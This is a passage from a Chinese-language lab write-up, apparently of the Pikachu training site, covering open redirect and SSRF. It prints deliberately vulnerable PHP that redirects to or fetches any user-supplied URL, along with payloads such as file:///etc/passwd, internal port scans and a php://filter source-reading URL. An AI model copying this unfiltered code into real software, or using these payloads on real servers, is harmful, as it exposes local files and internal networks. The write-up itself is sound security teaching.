</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$url</span> <span class="o">==</span> <span class="s1">&#39;i&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;好的,希望你能坚持做你自己!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:</span><span class="si">{</span><span class="nv">$url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>可以看到后端并没有对传参进行过滤，这样很容易被非法分子利用</p>
<p>总而言之，互联网弄潮儿们平时冲浪还是要擦亮眼睛小心谨慎，不要乱点链接</p>
<h2 id="ssrf">SSRF</h2>
<h3 id="概述-14">概述</h3>
<p>服务器端请求伪造（Server-Side Request Forgery，SSRF）形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据</p>
<p>数据流：攻击者&ndash;&gt;服务器&ndash;&gt;目标地址</p>
<p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p>
<p>PHP中下面函数的使用不当会导致SSRF</p>
<ul>
<li><code>file_get_contents()</code></li>
<li><code>fsockopen()</code></li>
<li><code>curl_exec()</code></li>
</ul>
<p>如果一定要通过后台服务器远程去对用户指定（或者预埋在前端的请求）的地址进行资源请求，则务必要做好目标地址的过滤</p>
<h3 id="ssrfcurl">SSRF（curl）</h3>
<p>页面给出一个超链接，点开返回一段文字</p>
<p><img alt="img" src="./img/2022091-12.png"></p>
<p>看看URL，发现是通过GET请求给服务器传入一个URL</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php
</code></pre><p>改一下URL就可以将此服务器当做跳板从别的站点获取信息</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com
</code></pre><p><img alt="img" src="./img/2022092-6.png"></p>
<p>还可以用来扫描其他服务器的端口</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/ssrf/ssrf_curl.php?url=http://light.asuka39.top:9002
</code></pre><p><img alt="img" src="./img/2022093-4.png"></p>
<p>看看后端源码片段，使用了<code>curl_exec()</code>函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;ssrf_curl.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$FILEDIR</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$RD</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$FILEDIR</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//payload:
</span></span></span><span class="line"><span class="cl"><span class="c1">//file:///etc/passwd  读取文件
</span></span></span><span class="line"><span class="cl"><span class="c1">//http://192.168.1.15:22 根据banner返回,错误提示,时间延迟扫描端口
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$URL</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$CH</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$URL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$CH</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$CH</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$RES</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$CH</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$CH</span><span class="p">)</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
</span></span></span><span class="line"><span class="cl"><span class="c1">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet
</span></span></span><span class="line"><span class="cl"><span class="c1">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="nv">$RES</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="ssrffile_get_content">SSRF（file_get_content）</h3>
<p>同样是GET请求传入URL，服务器通过传入的URL获取信息</p>
<p><img alt="img" src="./img/2022094-2.png"></p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php
</code></pre><p>其实和之前的情况差不多，但是<code>file_get_contents()</code>函数支持PHP内置方法读取源码</p>
<p>构造payload，将源码文件通过Base64加密后传到前端</p>
<pre tabindex="0"><code>php://filter/read=convert.base64-encode/resource=ssrf.php
</code></pre><p><img alt="img" src="./img/2022095-1.png"></p>
<p>解密后就能拿到后端源码了</p>
<p><img alt="img" src="./img/2022096.png"></p>
<p>看看后端源码片段，使用了<code>file_get_contents()</code>函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;ssrf_fgc.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span 